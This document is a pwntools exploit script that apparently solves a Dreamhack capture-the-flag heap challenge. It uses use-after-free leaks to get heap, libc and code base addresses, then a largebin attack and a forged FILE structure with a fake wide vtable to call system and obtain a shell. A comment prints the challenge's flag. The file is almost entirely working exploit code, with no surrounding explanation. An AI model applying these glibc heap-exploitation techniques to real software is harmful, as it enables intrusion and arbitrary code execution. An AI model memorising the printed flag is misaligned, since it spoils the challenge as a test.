#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = 'chall_patched'
HOST = 'host3.dreamhack.games'
PORT = 11507
GDBSERVER_PORT = 7777

exe = ELF(exe_path, checksec=False)
libc = exe.libc
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
set sysroot .
brva 0x1687
# b*_IO_flush_all+227
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.DOCKER:
        p = remote(HOST, PORT)
        if args.GDB:
            log.info("1: Vào terminal Docker, lấy PID:")
            log.info("    ps aux | grep prob")
            log.info("2: Attach gdbserver vào PID đó:")
            log.info("    gdbserver --attach 0.0.0.0:7777 <PID>")
            input("3: ENTER để GDB kết nối...")
            gdb.attach((HOST, GDBSERVER_PORT), exe=exe.path, gdbscript=gdbscript)
            input("[!] GDB attached. Press ENTER to continue...")
        return p
    else:
        p = process(exe.path)
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            input("[!] GDB attached. Press ENTER to continue...")
        return p

p = start()

def sla(prompt, data): p.sendlineafter(prompt, data)
def sa(prompt, data): p.sendafter(prompt, data)
def s(data): p.send(data)
def sl(data): p.sendline(data)
def rcu(data): return p.recvuntil(data)
def rl(): return p.recvline()

# ============================EXPLOIT============================
def alloc(idx, size):
    sla(b'>> ', b'1')
    sla(b'idx: ', str(idx).encode())
    sla(b'size: ', str(size).encode())
def free(idx):
    sla(b'>> ', b'2')
    sla(b'idx: ', str(idx).encode())
def edit(idx, content):
    sla(b'>> ', b'3')
    sla(b'idx: ', str(idx).encode())
    sa(b'content: ', content)
def view(idx):
    sla(b'>> ', b'4')
    sla(b'idx: ', str(idx).encode())

alloc(6, 0x10)
alloc(0, 0x410)
alloc(1, 0x20)
alloc(2, 0x420)
alloc(3, 0x30)

# leak heap
free(1)
view(1)
heap_base = u64(p.recv(8)) << 12

# leak libc
free(2)
view(2)
libc.address = u64(p.recv(8)) - 0x203b20

log.success(f"heap base: {hex(heap_base)}")
log.success(f"libc base: {hex(libc.address)}")

alloc(4,0x430)

edit(4, b"A"*8)
view(4)
p.recv(0xa0)
code_base = u64(p.recv(8)) - 0x202f
log.success(f"code base: {hex(code_base)}")
edit(4, b"\x00"*0x438 + p64(0x20051))

free(0)
# fsop
# https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/ioputs.c#L32
# https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/wfileops.c#L198


fileptr = heap_base + 0x2b0 
system = libc.symbols['system']

chain = code_base + 0x4120
payload_2 = p64(libc.address + 0x203f10) * 2 + p64(chain-0x20) * 2
payload_2 = payload_2.ljust(0x420, b"\x00") + p64(0x430) + p64(0x40)
edit(2, payload_2)

flags = u64(b"  sh\x00\x00\x00\x00") # bypass cond f->_flags & _IO_NO_WRITES
edit(6, p64(0) * 2 + p64(flags) + p64(0x421))

payload_0 = bytearray(0x420)

# unsorted bin fake ptrs
ptr = libc.address + 0x203b20
payload_0[0x00:0x10] = p64(ptr) * 2 # fd + bk

# fake stdout
payload_0[0x88-0x10 : 0x90-0x10] = p64(fileptr + 0x300)               # _lock
payload_0[0xa0-0x10 : 0xa8-0x10] = p64(fileptr + 0x100)               # _wide_data
payload_0[0xc0-0x10 : 0xc4-0x10] = p32(0)                             # _mode = 0
payload_0[0xd8-0x10 : 0xe0-0x10] = p64(libc.symbols['_IO_wfile_jumps'] - 0x20) # vtable

# fake _wide_data
payload_0[0x118-0x10 : 0x120-0x10] = p64(0)                           # _IO_write_base
payload_0[0x120-0x10 : 0x128-0x10] = p64(1)                           # _IO_write_ptr 
payload_0[0x1e0-0x10 : 0x1e8-0x10] = p64(fileptr + 0x200)             # fake _wide_vtable

# fake _wide_vtable
payload_0[0x268-0x10 : 0x270-0x10] = p64(system)                      # doallocate = system

# fake chunk header
payload_0[0x410 : 0x418] = p64(0x420) # prev_size
payload_0[0x418 : 0x420] = p64(0x30)  # size = 0x30

edit(0, bytes(payload_0))

# trigger largebin attack
alloc(5, 0x440)

p.wait(0.5)
sl(b"cat flag*")
# DH{malloc_once_per_size:QmfUXTC87jPZRNZNoo74AQ==}
p.interactive()
